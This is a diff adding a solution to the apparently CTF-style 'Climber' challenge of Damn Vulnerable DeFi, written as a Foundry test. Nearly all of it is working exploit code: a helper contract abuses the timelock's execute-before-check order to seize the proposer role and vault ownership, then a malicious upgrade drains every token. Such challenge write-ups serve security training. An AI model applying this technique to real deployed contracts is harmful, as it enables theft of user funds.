@@ -3,11 +3,51 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
+
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+contract Scheduler {
+    function schedule(address att, address v, address payable tl, bytes32 salt) external {
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        //change delay to 0;
+        targets[0] = tl;
+        dataElements[0] = abi.encodeWithSelector(ClimberTimelock(tl).updateDelay.selector, 0);
+
+        //update proposal role
+        targets[1] = tl;
+        dataElements[1] = abi.encodeWithSelector(
+            ClimberTimelock(tl).grantRole.selector, ClimberTimelock(tl).PROPOSER_ROLE(), address(this)
+        );
+
+        // transfer ownership
+        targets[2] = v;
+        dataElements[2] = abi.encodeWithSelector(ClimberVault(v).transferOwnership.selector, att);
+
+        // schedule
+        targets[3] = address(this);
+        dataElements[3] = abi.encodeWithSelector(this.schedule.selector, att, v, tl, salt);
+
+        ClimberTimelock(tl).schedule(targets, values, dataElements, salt);
+    }
+}
+
+contract ClimberVaultV2 is ClimberVault {
+    constructor() initializer {}
+
+    function withdrawAll(address tokenAddress) external onlyOwner {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
+    }
+}
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -72,6 +112,46 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+
+        Scheduler scheduler = new Scheduler();
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+        bytes32 salt = 0;
+
+        //change delay to 0;
+        targets[0] = address(climberTimelock);
+        dataElements[0] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);
+
+        //update proposal role
+        targets[1] = address(climberTimelock);
+        dataElements[1] = abi.encodeWithSelector(
+            climberTimelock.grantRole.selector, climberTimelock.PROPOSER_ROLE(), address(scheduler)
+        );
+
+        // transfer ownership
+        targets[2] = address(climberVaultProxy);
+        dataElements[2] = abi.encodeWithSelector(climberImplementation.transferOwnership.selector, attacker);
+
+        // schedule
+        targets[3] = address(scheduler);
+        dataElements[3] = abi.encodeWithSelector(
+            scheduler.schedule.selector, attacker, address(climberVaultProxy), payable(address(climberTimelock)), salt
+        );
+
+        climberTimelock.execute(targets, values, dataElements, salt);
+
+        ClimberVaultV2 newVault = new ClimberVaultV2();
+        //console.log(ClimberVaultV2(address(climberVaultProxy)).owner());
+
+        // Upgrade the proxy implementation to the new vault
+        ClimberVaultV2(address(climberVaultProxy)).upgradeTo(address(newVault));
+        ClimberVaultV2(address(climberVaultProxy)).withdrawAll(address(dvt));
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
